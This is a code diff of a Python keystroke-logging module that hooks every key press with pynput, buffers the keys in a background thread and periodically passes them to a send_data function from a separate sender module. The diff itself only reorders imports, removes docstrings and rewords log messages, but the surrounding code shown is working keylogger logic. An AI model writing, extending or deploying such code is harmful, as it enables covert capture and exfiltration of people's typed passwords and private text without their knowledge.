@@ -1,9 +1,9 @@
 import time
-import threading
 import config
+import threading
 from pynput import keyboard
-from utils import get_timestamp, log
 from sender import send_data
+from utils import get_timestamp, log
 
 
 # Shared state
@@ -13,14 +13,12 @@ last_flush_time = time.time()
 
 
 def add_key(key_str):
-    """Add a key to the buffer in a thread-safe way"""
     global buffer
     with buffer_lock:
         buffer.append(key_str)
 
 
 def flush_buffer():
-    """Flush the buffer and return its content"""
     global buffer, last_flush_time
     with buffer_lock:
         if not buffer:
@@ -33,7 +31,6 @@ def flush_buffer():
 
 
 def flush_periodically():
-    """Periodically flush the buffer at configured intervals"""
     while True:
         time.sleep(config.KEYSTROKE_BUFFER_INTERVAL)
         text = flush_buffer()
@@ -46,7 +43,6 @@ def flush_periodically():
 
 
 def on_press(key):
-    """Handle key press events and convert to string representation"""
     try:
         # Convert key to string representation
         if hasattr(key, "char") and key.char:
@@ -118,16 +114,15 @@ def on_press(key):
     except AttributeError as e:
         log(f"Key attribute error: {e}", "ERROR", "keystrokes")
     except Exception as e:
-        log(f"Keystroke error: {e}", "ERROR", "keystrokes")
+        log(f"Keystrokes monitoring error: {e}", "ERROR", "keystrokes")
 
 
 def start_keystroke_monitoring():
-    """Start keystroke monitoring and buffer management"""
     global buffer, last_flush_time
     buffer = []
     last_flush_time = time.time()
 
-    log("Keystroke monitoring started", module="keystrokes")
+    log("Keystrokes monitoring started", module="keystrokes")
 
     # Start periodic flusher thread
     flusher_thread = threading.Thread(target=flush_periodically, daemon=True)
@@ -137,9 +132,9 @@ def start_keystroke_monitoring():
         try:
             listener.join()
         except KeyboardInterrupt:
-            log("Keystroke monitoring stopped", module="keystrokes")
+            log("Keystrokes monitoring stopped", module="keystrokes")
         except Exception as e:
-            log(f"Keystroke monitoring failed: {e}", "ERROR", "keystrokes")
+            log(f"Keystrokes monitoring failed: {e}", "ERROR", "keystrokes")
         finally:
             # Flush any remaining keys before exit
             text = flush_buffer()
